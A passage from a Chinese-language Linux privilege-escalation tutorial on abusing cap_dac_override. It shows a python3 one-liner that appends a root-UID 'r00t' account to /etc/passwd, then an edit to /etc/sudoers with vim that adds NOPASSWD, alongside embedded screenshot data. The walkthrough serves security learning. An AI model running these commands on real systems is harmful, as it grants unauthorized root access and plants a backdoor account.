<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="820" height="157" class="img_ev3q"></p>
<p>这看起来很简单，但有一点我们需要解决，那就是追加数据。如果不指定追加数据，我们就会用一个条目完全覆盖 passwd 文件，这是非常糟糕的！</p>
<p>好的，让我们用它在 /etc/passwd 中创建一个新的 root 用户，以便我们可以 su 进入该用户帐户 - 用以有效地将我们的权限提升到 root。</p>
<p>为此，我们必须首先使用 <strong>openssl</strong> 创建一个散列密码。为简单起见，我们将密码设置为“password”。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">openssl passwd password</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304927-178730733-20b7212aa2cd2e545f840069e237034d.png" width="463" height="64" class="img_ev3q"></p>
<p>请记下哈希值 <strong>eVpbhRfVtH1Uc</strong> 因为我们将在下一个命令中使用它。</p>
<p>因此，如果我们想创建一个名为 r00t 的用户，我们可以在 passwd 文件中添加以下行 ：<strong>r00t:eVpbhRfVtH1Uc:0:0:root:/root:/bin/bash</strong> ，但首先我们需要更新命令以附加数据，只需将“w+”替换为“a”即可，如下所示：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/python3 -c &#x27;open(&quot;/etc/passwd&quot;,&quot;a&quot;).write(&quot;r00t:eVpbhRfVtH1Uc:0:0:root:/root:/bin/bash&quot;)&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164315172-696972610-3a95e394efabdf902602faba4c333ccc.png" width="1009" height="795" class="img_ev3q"></p>
<p>现在我们只需使用 <strong>su r00t</strong> ，然后在提示时提供密码“ <strong>password ”。</strong></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304664-708970531-77a184504c182789e3f8ce2fa25d9e19.png" width="396" height="112" class="img_ev3q"></p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="322cap_dac_override--vim"><strong><div id="id3.2.2">3.2.2、cap_dac_override – vim</div></strong><a href="#322cap_dac_override--vim" class="hash-link" aria-label="322cap_dac_override--vim的直接链接" title="322cap_dac_override--vim的直接链接">​</a></h6>
<p>有什么比使用 Python 编辑文件更简单？文本编辑器。如果在文本编辑器上设置了此功能，游戏很快就会结束。</p>
<p>就像我们使用 vim 读取文件一样，我们可以打开任何我们想要的文件，编辑它，然后保存更改。</p>
<p>举个例子，当我们以用户 juggernaut 的身份立足时，我们不知道他们的密码。此外，在枚举过程中，我们发现 juggernaut 属于 sudoers 组。问题是，默认情况下，要使用 <strong>sudo su</strong> 并成为 root，我们需要知道当前用户的密码。这时，编辑 sudoers 文件就派上用场了。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/vim /etc/sudoers</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305543-1089050024-faeea6fa6939cd922f15c6c5dcabb222.png" width="690" height="417" class="img_ev3q"></p>
<p>如果我们向下滚动到上面突出显示的行，我们可以添加 <strong>NOPASSWD</strong> 来绕过密码提示。为此，我们需要首先按“i”键进入“插入”模式，然后编辑该行，如下所示：</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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